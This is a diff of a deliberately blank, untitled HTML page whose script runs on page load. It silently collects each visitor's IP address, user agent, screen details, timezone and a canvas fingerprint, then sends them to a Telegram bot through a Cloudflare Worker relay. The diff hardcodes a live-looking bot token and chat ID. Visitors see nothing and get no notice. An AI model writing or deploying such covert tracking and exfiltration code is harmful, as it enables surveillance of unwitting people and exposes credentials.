@@ -3,41 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title> <!-- Title bhi blank rakha hai -->
+    <title></title> <!-- Blank Title -->
     <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@0.7.33/src/ua-parser.min.js"></script>
     <style>
-        /* Screen ko poora blank aur dark rakhne ke liye */
         body, html {
             margin: 0;
             padding: 0;
             width: 100%;
             height: 100%;
-            background-color: #7a5353; /* Aap #000 (black) bhi kar sakte hain */
+            background-color: #7a5353; /* or #000 */
         }
     </style>
 </head>
 <body>
-    <!-- Yeh page user ko poora khali dikhega -->
-
     <script>
     (async () => {
-        // --- STEP 1: Yahan apna Bot Token aur Chat ID daalein ---
-        const TELEGRAM_BOT_TOKEN = '7712919519:AAEeR3i1iv06EzLqBPbzxCQFKh42clhAg3c';
-        const TELEGRAM_CHAT_ID = '1002745190343';
+        // --- Config ---
+        const TELEGRAM_BOT_TOKEN = "7712919519:AAEeR3i1iv06EzLqBPbzxCQFKh42clhAg3c";
+        const TELEGRAM_CHAT_ID   = "1002745190343";
+        const WORKER_URL         = "https://muddy-union-2fa4.z3957759.workers.dev/send";
 
-        // --- Function to send data to Telegram ---
+        // --- Function to send data via Cloudflare Worker ---
         const sendToTelegram = async (message) => {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                await fetch(WORKER_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
+                        token: TELEGRAM_BOT_TOKEN,
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown' // Optional: for better formatting
+                        text: message
                     }),
                 });
             } catch (error) {
@@ -45,46 +40,47 @@
             }
         };
 
-        // --- Helper function to get IP address ---
+        // --- Helper: Get IP ---
         const getIpAddress = async () => {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
+                const response = await fetch("https://api.ipify.org?format=json");
                 const data = await response.json();
-                return data.ip || 'Not Found';
-            } catch (error) {
+                return data.ip || "Not Found";
+            } catch {
                 return "Not Found";
             }
         };
 
-        // --- Fingerprinting function ---
+        // --- Helper: Fingerprint ---
         const getComprehensiveFingerprint = async () => {
             const getCanvasFingerprint = () => {
                 try {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
+                    const canvas = document.createElement("canvas");
+                    const ctx = canvas.getContext("2d");
                     ctx.fillText("Browser Fingerprint 123!@#", 2, 15);
                     return canvas.toDataURL();
-                } catch (e) { return "error"; }
+                } catch {
+                    return "error";
+                }
             };
-            
+
             const components = {
                 userAgent: navigator.userAgent,
                 language: navigator.language,
                 screenResolution: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
                 timezone: new Intl.DateTimeFormat().resolvedOptions().timeZone,
                 canvas: getCanvasFingerprint(),
             };
-            
+
             const componentString = JSON.stringify(components, Object.keys(components).sort());
-            const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(componentString));
+            const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(componentString));
             const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            return hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
         };
 
-        // --- Main execution block ---
+        // --- Main block ---
         const runAnalysisAndSend = async () => {
-            // Collect all data
             const parser = new UAParser();
             const result = parser.getResult();
             const [ipAddress, fingerprint] = await Promise.all([
@@ -92,7 +88,6 @@
                 getComprehensiveFingerprint()
             ]);
 
-            // Format the message for Telegram
             const message = `
 *🚨 New Visit Detected! 🚨*
 -----------------------------------
@@ -110,14 +105,12 @@
 \`${navigator.userAgent}\`
             `;
 
-            // Send the formatted message to Telegram
             await sendToTelegram(message);
         };
 
-        // Run everything when the page loads
-        window.addEventListener('load', runAnalysisAndSend);
+        window.addEventListener("load", runAnalysisAndSend);
     })();
     </script>
-
 </body>
 </html>
+
